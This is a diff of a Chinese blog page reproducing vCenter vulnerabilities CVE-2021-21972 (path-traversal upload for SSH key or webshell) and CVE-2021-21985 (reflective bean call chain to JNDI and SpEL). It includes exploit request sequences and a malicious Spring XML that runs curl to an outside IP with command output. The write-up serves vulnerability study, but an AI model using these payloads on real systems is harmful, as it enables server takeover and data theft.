@@ -194,7 +194,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-06-15 13:25:41" itemprop="dateModified" datetime="2023-06-15T13:25:41+08:00">2023-06-15</time>
+                <time title="修改时间：2023-06-15 13:27:27" itemprop="dateModified" datetime="2023-06-15T13:27:27+08:00">2023-06-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -212,14 +212,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>8.7k</span>
+              <span>9.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>16 分钟</span>
+              <span>17 分钟</span>
             </span>
 
         </div>
@@ -241,88 +241,103 @@
 <p>5.IDEA设置好远程JVM即可进行远程调试，但是这个洞涉及到的代码部分比较简单，所以就直接静态分析了。</p>
 <h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>造成漏洞主要代码定位到vropsplugin-service.jar包中，com.vmware.vropspluginui.mvc.ServicesController类中有关于文件上传的代码。<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.jpg" alt="1"><br>代码逻辑就是将tar文件解压上传到<code>/tmp/unicorn_ova_dir</code>目录。注意到如下部分：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.jpg" alt="2"><br>直接将tar的文件名与<code>/tmp/unicorn_ova_dir</code>拼接并写入文件，如果文件名存在<code>../</code>即可实现目录遍历。  </p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="ssh写公钥getshell"><a href="#ssh写公钥getshell" class="headerlink" title="ssh写公钥getshell"></a>ssh写公钥getshell</h3><p>找一找可利用的方法，既然是能够实现目录遍历的文件上传，先看一看vsphere-ui用户有写权限的目录：  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">su vsphere-ui</span><br><span class="line">find / -writable -type d |&amp; grep -v &quot;Permission denied&quot;</span><br><span class="line">```    </span><br><span class="line">发现`.ssh`可写，能够上传公钥，在本地写个公钥上传到vcenter:  </span><br><span class="line">![ssh](ssh.jpg)</span><br><span class="line">之后就能够利用私钥直接登录vsphere-ui用户了：  </span><br><span class="line">![3](3.jpg)  </span><br><span class="line">但是这个方法有个弊端，看一下shadow文件，可以看到：   </span><br><span class="line">![4](4.jpg) </span><br><span class="line">vsphere-ui用户密码过期时间为90天，需要提供原密码来修改密码，而原密码未设置（不是空密码），所以没法修改密码，大概就是只能利用90天，不过正常打的话感觉也够了。  </span><br><span class="line">### 上传webshell</span><br><span class="line">另一种思路是写入webshell，首先需要遍历找出有jsp的web.xml，并且目录可写：  </span><br><span class="line">![xml](web-xml.jpg)</span><br><span class="line">使用`VMware-VCSA-all-6.7.0-8217866`实现，`web`的资源目录为`/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/`,其中%d是随着重启行为发生改变的，所以可以构造上传包进行暴力批量添加。  </span><br><span class="line">向`https:/192.168.26.137/ui/vropspluginui/rest/services/uploadova`发送POST请求，上传带有目录穿越的`tar`包，内容为冰蝎4.0 aes加密默认的`shell.jsp`，如图：  </span><br><span class="line">![5](5.jpg)  </span><br><span class="line">冰蝎连接即可：  </span><br><span class="line">![6](6.jpg)  </span><br><span class="line">但是写shell漏洞在`13010631`及之后的版本中进行了修复,在`server-launcher.jar`包中调用了`com.vmware.vise.launcher.tomcat.TomcatLauncher`类，代码如下：  </span><br><span class="line">![7](7.jpg)  </span><br><span class="line">其中有个函数`deleteWorkDirectory`，如图：  </span><br><span class="line">![8](8.jpg)</span><br><span class="line">这个函数的作用就是删除`web`目录，先从命令行中的`catalina.base`获取设置的`Tomcat`工作目录`/usr/bin/vmware-vsphere-ui/server`,然后拼接`/work`路径并判断是否存在，不存在则返回，存在则调用`deleteDirectoryRecur`函数进行删除，如图：  </span><br><span class="line">![9](9.jpg)</span><br><span class="line">也就是说后面的版本是跑在内存里的，在网上看到有师傅说可以将webshell上传到`/usr/lib/vmware-vsphere-ui/server/static/resources/libs/`作为后门，然后等vCenter重启之后会被加载运行，但是我尝试了一下，发现并不可行，也不知道是怎么利用的。  </span><br><span class="line">## 武器化利用</span><br><span class="line">对于`13010631`之前版本的exp[https://github.com/NS-Sp4ce/CVE-2021-21972](https://github.com/NS-Sp4ce/CVE-2021-21972)这位师傅已经写好了。  </span><br><span class="line"></span><br><span class="line">## 参考链接</span><br><span class="line">[VMware vCenter漏洞分析（一）](https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)  </span><br><span class="line">[CVE-2021-21972 复现和分析](https://0x20h.com/p/7cb6.html)  </span><br><span class="line">[VMware VCenter Server漏洞调试环境搭建](https://3gstudent.github.io/VMware-VCenter-Server%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)  </span><br><span class="line">[VMware vSphere 6.7 虚拟化搭建及配置完整详细手册](https://blog.csdn.net/z136370204/article/details/111719373)</span><br><span class="line"></span><br><span class="line"># CVE-2021-21985</span><br><span class="line">## 漏洞简介</span><br><span class="line">默认启用的Virtual SAN Health Check插件中的/rest/*接口存在未授权访问，可利用不安全的反射调用实现getshell</span><br><span class="line">## 影响版本</span><br><span class="line">7.0 &lt;= vCenter Server &lt; 7.0 U2b</span><br><span class="line">6.7 &lt;= vCenter Server &lt; 6.7 U3n</span><br><span class="line">6.5 &lt;= vCenter Server &lt; 6.5 U3p</span><br><span class="line">4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2.1</span><br><span class="line">3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.2.1</span><br><span class="line">## 漏洞代码分析</span><br><span class="line">### 出网情况</span><br><span class="line">下载u3m和u3n（VMware-VCSA-all-6.7.0-18010531、VMware-VCSA-all-6.7.0-17713310）jar包，通过beyond compare进行diff。  </span><br><span class="line">定位到v5-vsan-context.jar包中的web.xml文件，如下图：  </span><br><span class="line">![diff1](diff1.jpg)  </span><br><span class="line">可以看到u3n相比u3m主要的变化，就是增加了对`/rest/*`路由的`authenticationFilter`过滤器。  </span><br><span class="line">具体到authentication.class中查看，主要是实现了对未登录请求的拦截，并返回401状态码，如图：  </span><br><span class="line">！[10](10.jpg)  </span><br><span class="line">另外一处变动是h5-vsan-service.jar中ProxygenController类中的invokeService方法。通过isAnnotationPresent来进行判断，检测反射调用过的方法是否带有`TsService`注解，可以理解为设置了白名单，如图：  </span><br><span class="line">![12](12.jpg)  </span><br><span class="line">而`TsService`注解源码为下：  </span><br><span class="line">![11](11.jpg)  </span><br><span class="line">invokeService方法会被`invokeServiceWithJson`和`invokeServiceWithMultipartFormData`调用，两个方法都是从url中获取`beanIdOrClassName`和`methodName`的值，如下图：  </span><br><span class="line">![13](13.jpg)  </span><br><span class="line">同时，会从请求体中获取`methodInput`的值，传入`invokeService`方法中。`invokeService`方法先获取bean实例，接着获取实例的方法列表并遍历，通过将proxygenSerializer类中的`deserializeMethodInput`转化为方法对象后进行反射调用，如下图：  </span><br><span class="line">![14](14.jpg)![15](15.jpg)  </span><br><span class="line">由之前分析可以得知，vcenter通过rhttpproxy，反向代理复用端口，通过`META-INF/MANIFEST.MF`和`web.xml`可以知道vsan插件部署的web路径为`ui/h5-vsan/rest`,在结合之前路由映射的分析，推断漏洞入口为`https://192.168.26.135/ui/h5-vsan/rest/proxy/service/&#123;beanIdOrClassName&#125;/&#123;methodName&#125;`。通过触发危险方法的调用实现RCE，但是不能直接使用Runtime.exec，因为getBean时会去beanMap中查找，所以要从一堆bean里找到可以利用的链子。在`vsan-h5-client/plugins/h5-vsan-service/META-INF/spring/base/*.xml`中查看，所有的bean的scope都是缺省的`singleton`，且都没有配置`lazy-init`，也就是所有的bean都是单例加载的。可以看到bean配置中存在`org.springframework.beans.factory.config.MethodInbokingFactoryBean`, 通过[官方API文档](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/config/MethodInvokingFactoryBean.html#getObject())可以找到继承链，如下图：  </span><br><span class="line">![16](16.jpg)  </span><br><span class="line">可以从官方文档中看到`MethodInvokingFactoryBean`继承了`MethodInvoking`中的`invoke`方法，源码如下：  </span><br><span class="line">![17](17.jpg)  </span><br><span class="line">由`targetObject`,`preparedMethod`调用静态方法，`ReflectionUtils.makeAccessible`修改方法为可见，再通过`getArgument`获取参数。 想到利用JNDI注入进行利用，而`javax.naming.InitialContext.doLookup`方法是静态的，调用静态方法不需要实例，也就不需要`targetObject`，所以可以通过`setTargetObject`将其设置为null。再通过`setArgument`将参数值设置为Object[]的JNDI远程方法即可，在代码中反向跟进一下调用链，如下：  </span><br><span class="line">```  </span><br><span class="line">preparedMethod</span><br><span class="line">	this.methodObject</span><br><span class="line">		targetClass.getMethod(targetMethod, argTypes)</span><br><span class="line">			resolveClassName(className)</span><br><span class="line">				String className = this.staticMethod.substring(0, lastDotIndex)</span><br><span class="line">				String methodName = this.staticMethod.substring(lastDotIndex + 1)</span><br><span class="line">```  </span><br><span class="line">可以得到一条利用链：`&#123;beanIdOrClassName&#125;/&#123;methodName&#125; -&gt; ... -&gt; MethodInvokingFactoryBean -&gt; MethodInvoker -&gt; JNDI（javax.naming.InitialContext.doLookup） -&gt; 恶意RMI/LDAP服务器提供的远程对象`,搜索配置文件中class为`MethodInvokingFactoryBean`的bean就能够找到链接利用链两端的部分，从下面bean中任选一个就行：  </span><br></pre></td></tr></table></figure>
-<p>vsanProviderUtils_setVmodlHelper<br>vsanProviderUtils_setVsanServiceFactory<br>vsanQueryUtil_setDataService<br>vsanCapabilityUtils_setVsanCapabilityCacheManager<br>vsanUtils_setMessageBundle<br>vsanFormatUtils_setUserSessionService<br>vsphereHealthProviderUtils_setVsphereHealthServiceFactory</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为以bean的名字调用FactoryBean时实际上得到的是一个实例，因此需要在bean之前加上`&amp;`来帮助我们获取`MethodInvokingFactoryBean`本身。  </span><br><span class="line">通过POST请求依次调用一下各方法构造利用链：    </span><br></pre></td></tr></table></figure>
-<p>&amp;{beanName}&#x2F;setTargetObject<br>{“methodInput”:[null]}</p>
-<p>&amp;{beanName}&#x2F;setStaticMethod<br>{“methodInput”:[“javax.naming.InitialContext.doLookup”]}</p>
-<p>&amp;{beanName}&#x2F;setTargetMethod<br>{“methodInput”:[“doLookup”]}</p>
-<p>&amp;{beanName}&#x2F;setArguments<br>{“methodInput”:[[“rmi:&#x2F;&#x2F;vps&#x2F;ExecByEL”]]}</p>
-<p>&amp;{beanName}&#x2F;prepare<br>{“methodInput”:[]}</p>
-<p>&amp;{beanName}&#x2F;invoke<br>{“methodInput”:[]}</p>
-<pre><code>![rmi](rmi.jpg)
-JNDI的调用方式基本就是这样，但是vcenter在漏洞修复前的那几个版本JDK版本已经非常高了(8u281)，导致JNDI注入的手段基本没法利用。但是看了漏洞作者使用的方法还是很好利用的。  
-他利用`vmodlContext`这个bean，对应vropsplugin-service.jar中的`com.vmware.vim.vmomi.cor.types.impl.VmodContextImpl`类中的`loadVmodlPackage`方法，代码如下图：
-![18](18.jpg)
-该方法中通过`NonValidatingClassPathXmlApplicationContext`加载`contextPath`，而该类继承于`ClassPathXmlApplicationContext`:
-![19](19.jpg)
-会调用到该类的构造方法，而这个构造方法能够指定一个XML文件路径，Spring会解析XML的内容，造成SpEL注入。  
-还需要注意一点就是：
-![20](20.jpg)![21](21.jpg)
-该方法会将路径中的`.`替换为`/`，所以无法指定正常的ip，可以用十进制ip绕过：
-![22](22.jpg)
-在vps构造恶意context.xml文件，即可实现RCE：  
+<pre><code>su vsphere-ui
+find / -writable -type d |&amp; grep -v &quot;Permission denied&quot;
 </code></pre>
-<?xml version="1.0" encoding="UTF-8"?>
-<p><beans xmlns="http://www.springframework.org/schema/beans"
-       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-       xmlns:context="http://www.springframework.org/schema/context"
-       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd"></p>
-<pre><code>&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;
-    &lt;constructor-arg&gt;
-        &lt;list&gt;
+<p>发现<code>.ssh</code>可写，能够上传公钥，在本地写个公钥上传到vcenter:<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ssh.jpg" alt="ssh"><br>之后就能够利用私钥直接登录vsphere-ui用户了：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.jpg" alt="3"><br>但是这个方法有个弊端，看一下shadow文件，可以看到：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.jpg" alt="4"><br>vsphere-ui用户密码过期时间为90天，需要提供原密码来修改密码，而原密码未设置（不是空密码），所以没法修改密码，大概就是只能利用90天，不过正常打的话感觉也够了。  </p>
+<h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><p>另一种思路是写入webshell，首先需要遍历找出有jsp的web.xml，并且目录可写：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/web-xml.jpg" alt="xml"><br>使用<code>VMware-VCSA-all-6.7.0-8217866</code>实现，<code>web</code>的资源目录为<code>/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/</code>,其中%d是随着重启行为发生改变的，所以可以构造上传包进行暴力批量添加。<br>向<code>https:/192.168.26.137/ui/vropspluginui/rest/services/uploadova</code>发送POST请求，上传带有目录穿越的<code>tar</code>包，内容为冰蝎4.0 aes加密默认的<code>shell.jsp</code>，如图：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.jpg" alt="5"><br>冰蝎连接即可：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.jpg" alt="6"><br>但是写shell漏洞在<code>13010631</code>及之后的版本中进行了修复,在<code>server-launcher.jar</code>包中调用了<code>com.vmware.vise.launcher.tomcat.TomcatLauncher</code>类，代码如下：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.jpg" alt="7"><br>其中有个函数<code>deleteWorkDirectory</code>，如图：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.jpg" alt="8"><br>这个函数的作用就是删除<code>web</code>目录，先从命令行中的<code>catalina.base</code>获取设置的<code>Tomcat</code>工作目录<code>/usr/bin/vmware-vsphere-ui/server</code>,然后拼接<code>/work</code>路径并判断是否存在，不存在则返回，存在则调用<code>deleteDirectoryRecur</code>函数进行删除，如图：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.jpg" alt="9"><br>也就是说后面的版本是跑在内存里的，在网上看到有师傅说可以将webshell上传到<code>/usr/lib/vmware-vsphere-ui/server/static/resources/libs/</code>作为后门，然后等vCenter重启之后会被加载运行，但是我尝试了一下，发现并不可行，也不知道是怎么利用的。  </p>
+<h2 id="武器化利用"><a href="#武器化利用" class="headerlink" title="武器化利用"></a>武器化利用</h2><p>对于<code>13010631</code>之前版本的exp<a target="_blank" rel="noopener" href="https://github.com/NS-Sp4ce/CVE-2021-21972">https://github.com/NS-Sp4ce/CVE-2021-21972</a>这位师傅已经写好了。  </p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">VMware vCenter漏洞分析（一）</a><br><a target="_blank" rel="noopener" href="https://0x20h.com/p/7cb6.html">CVE-2021-21972 复现和分析</a><br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/VMware-VCenter-Server%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">VMware VCenter Server漏洞调试环境搭建</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/z136370204/article/details/111719373">VMware vSphere 6.7 虚拟化搭建及配置完整详细手册</a></p>
+<h1 id="CVE-2021-21985"><a href="#CVE-2021-21985" class="headerlink" title="CVE-2021-21985"></a>CVE-2021-21985</h1><h2 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>默认启用的Virtual SAN Health Check插件中的&#x2F;rest&#x2F;*接口存在未授权访问，可利用不安全的反射调用实现getshell</p>
+<h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>7.0 &lt;&#x3D; vCenter Server &lt; 7.0 U2b<br>6.7 &lt;&#x3D; vCenter Server &lt; 6.7 U3n<br>6.5 &lt;&#x3D; vCenter Server &lt; 6.5 U3p<br>4.x &lt;&#x3D; Cloud Foundation (vCenter Server) &lt; 4.2.1<br>3.x &lt;&#x3D; Cloud Foundation (vCenter Server) &lt; 3.10.2.1</p>
+<h2 id="漏洞代码分析-1"><a href="#漏洞代码分析-1" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><h3 id="出网情况"><a href="#出网情况" class="headerlink" title="出网情况"></a>出网情况</h3><p>下载u3m和u3n（VMware-VCSA-all-6.7.0-18010531、VMware-VCSA-all-6.7.0-17713310）jar包，通过beyond compare进行diff。<br>定位到v5-vsan-context.jar包中的web.xml文件，如下图：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/diff1.jpg" alt="diff1"><br>可以看到u3n相比u3m主要的变化，就是增加了对<code>/rest/*</code>路由的<code>authenticationFilter</code>过滤器。<br>具体到authentication.class中查看，主要是实现了对未登录请求的拦截，并返回401状态码，如图：<br>！<a href="10.jpg">10</a><br>另外一处变动是h5-vsan-service.jar中ProxygenController类中的invokeService方法。通过isAnnotationPresent来进行判断，检测反射调用过的方法是否带有<code>TsService</code>注解，可以理解为设置了白名单，如图：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.jpg" alt="12"><br>而<code>TsService</code>注解源码为下：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.jpg" alt="11"><br>invokeService方法会被<code>invokeServiceWithJson</code>和<code>invokeServiceWithMultipartFormData</code>调用，两个方法都是从url中获取<code>beanIdOrClassName</code>和<code>methodName</code>的值，如下图：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.jpg" alt="13"><br>同时，会从请求体中获取<code>methodInput</code>的值，传入<code>invokeService</code>方法中。<code>invokeService</code>方法先获取bean实例，接着获取实例的方法列表并遍历，通过将proxygenSerializer类中的<code>deserializeMethodInput</code>转化为方法对象后进行反射调用，如下图：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.jpg" alt="14"><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.jpg" alt="15"><br>由之前分析可以得知，vcenter通过rhttpproxy，反向代理复用端口，通过<code>META-INF/MANIFEST.MF</code>和<code>web.xml</code>可以知道vsan插件部署的web路径为<code>ui/h5-vsan/rest</code>,在结合之前路由映射的分析，推断漏洞入口为<code>https://192.168.26.135/ui/h5-vsan/rest/proxy/service/&#123;beanIdOrClassName&#125;/&#123;methodName&#125;</code>。通过触发危险方法的调用实现RCE，但是不能直接使用Runtime.exec，因为getBean时会去beanMap中查找，所以要从一堆bean里找到可以利用的链子。在<code>vsan-h5-client/plugins/h5-vsan-service/META-INF/spring/base/*.xml</code>中查看，所有的bean的scope都是缺省的<code>singleton</code>，且都没有配置<code>lazy-init</code>，也就是所有的bean都是单例加载的。可以看到bean配置中存在<code>org.springframework.beans.factory.config.MethodInbokingFactoryBean</code>, 通过<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/config/MethodInvokingFactoryBean.html#getObject()">官方API文档</a>可以找到继承链，如下图：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16.jpg" alt="16"><br>可以从官方文档中看到<code>MethodInvokingFactoryBean</code>继承了<code>MethodInvoking</code>中的<code>invoke</code>方法，源码如下：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/17.jpg" alt="17"><br>由<code>targetObject</code>,<code>preparedMethod</code>调用静态方法，<code>ReflectionUtils.makeAccessible</code>修改方法为可见，再通过<code>getArgument</code>获取参数。 想到利用JNDI注入进行利用，而<code>javax.naming.InitialContext.doLookup</code>方法是静态的，调用静态方法不需要实例，也就不需要<code>targetObject</code>，所以可以通过<code>setTargetObject</code>将其设置为null。再通过<code>setArgument</code>将参数值设置为Object[]的JNDI远程方法即可，在代码中反向跟进一下调用链，如下：  </p>
+<pre><code>preparedMethod
+    this.methodObject
+        targetClass.getMethod(targetMethod, argTypes)
+            resolveClassName(className)
+                String className = this.staticMethod.substring(0, lastDotIndex)
+                String methodName = this.staticMethod.substring(lastDotIndex + 1)
+</code></pre>
+<p>可以得到一条利用链：<code>&#123;beanIdOrClassName&#125;/&#123;methodName&#125; -&gt; ... -&gt; MethodInvokingFactoryBean -&gt; MethodInvoker -&gt; JNDI（javax.naming.InitialContext.doLookup） -&gt; 恶意RMI/LDAP服务器提供的远程对象</code>,搜索配置文件中class为<code>MethodInvokingFactoryBean</code>的bean就能够找到链接利用链两端的部分，从下面bean中任选一个就行：  </p>
+<pre><code>vsanProviderUtils_setVmodlHelper
+vsanProviderUtils_setVsanServiceFactory
+vsanQueryUtil_setDataService
+vsanCapabilityUtils_setVsanCapabilityCacheManager
+vsanUtils_setMessageBundle
+vsanFormatUtils_setUserSessionService
+vsphereHealthProviderUtils_setVsphereHealthServiceFactory
+</code></pre>
+<p>因为以bean的名字调用FactoryBean时实际上得到的是一个实例，因此需要在bean之前加上<code>&amp;</code>来帮助我们获取<code>MethodInvokingFactoryBean</code>本身。<br>通过POST请求依次调用一下各方法构造利用链：    </p>
+<pre><code>&amp;&#123;beanName&#125;/setTargetObject
+&#123;&quot;methodInput&quot;:[null]&#125;
+
+&amp;&#123;beanName&#125;/setStaticMethod
+&#123;&quot;methodInput&quot;:[&quot;javax.naming.InitialContext.doLookup&quot;]&#125;
+
+&amp;&#123;beanName&#125;/setTargetMethod
+&#123;&quot;methodInput&quot;:[&quot;doLookup&quot;]&#125;
+
+&amp;&#123;beanName&#125;/setArguments
+&#123;&quot;methodInput&quot;:[[&quot;rmi://vps/ExecByEL&quot;]]&#125;
+
+&amp;&#123;beanName&#125;/prepare
+&#123;&quot;methodInput&quot;:[]&#125;
+
+&amp;&#123;beanName&#125;/invoke
+&#123;&quot;methodInput&quot;:[]&#125;
+</code></pre>
+<p><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/rmi.jpg" alt="rmi"><br>JNDI的调用方式基本就是这样，但是vcenter在漏洞修复前的那几个版本JDK版本已经非常高了(8u281)，导致JNDI注入的手段基本没法利用。但是看了漏洞作者使用的方法还是很好利用的。<br>他利用<code>vmodlContext</code>这个bean，对应vropsplugin-service.jar中的<code>com.vmware.vim.vmomi.cor.types.impl.VmodContextImpl</code>类中的<code>loadVmodlPackage</code>方法，代码如下图：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/18.jpg" alt="18"><br>该方法中通过<code>NonValidatingClassPathXmlApplicationContext</code>加载<code>contextPath</code>，而该类继承于<code>ClassPathXmlApplicationContext</code>:<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/19.jpg" alt="19"><br>会调用到该类的构造方法，而这个构造方法能够指定一个XML文件路径，Spring会解析XML的内容，造成SpEL注入。<br>还需要注意一点就是：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20.jpg" alt="20"><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/21.jpg" alt="21"><br>该方法会将路径中的<code>.</code>替换为<code>/</code>，所以无法指定正常的ip，可以用十进制ip绕过：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/22.jpg" alt="22"><br>在vps构造恶意context.xml文件，即可实现RCE：  </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
+       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;
+
+    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;
+        &lt;constructor-arg&gt;
+            &lt;list&gt;
+                &lt;value&gt;/bin/bash&lt;/value&gt;
+                &lt;value&gt;-c&lt;/value&gt;
+                &lt;value&gt;curl 1.15.222.79:1234?`whoami`&lt;/value&gt;
+            &lt;/list&gt;
+        &lt;/constructor-arg&gt;
+        &lt;property name=&quot;whatever&quot; value=&quot;#&#123;pb.start()&#125;&quot; /&gt;
+    &lt;/bean&gt;
+&lt;/beans&gt;
+</code></pre>
+<p><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/23.jpg" alt="23">  </p>
+<h3 id="不出网情况"><a href="#不出网情况" class="headerlink" title="不出网情况"></a>不出网情况</h3><p>漏洞本质的利用就是获取一个恶意xml文件的内容，而java本身又没有data伪协议，所以需要寻找其他的利用方法，比如返回内容可控的ssrf或者文件上传之类的漏洞。根据漏洞作者的文章得知，利用了<code>vsan-health</code>组件中位于<code>/usr/lib/vmware-vpx/vsan-health/pyMoVsan/</code>的<code>VsanHttpProvider.py</code>，该处存在着未授权访问的ssrf，还是不懂是怎么找到这样的利用方式的T T.漏洞代码如下：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/24.jpg" alt="24"><br>通过<code>urlopen</code>库函数进行http请求，解压返回内容，匹配文件名为<code>.*offline_bundle.*</code>的文件并返回内容。python的<code>urlopen</code>支持data伪协议，所以可以构造压缩包并base64编码。<br>但是这样虽然可以不出网利用，但是无法回显结果。通过查看Bean列表，发现存在<code>systemProperties</code>的bean，该bean也存在方法可以获取属性内容：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/25.jpg" 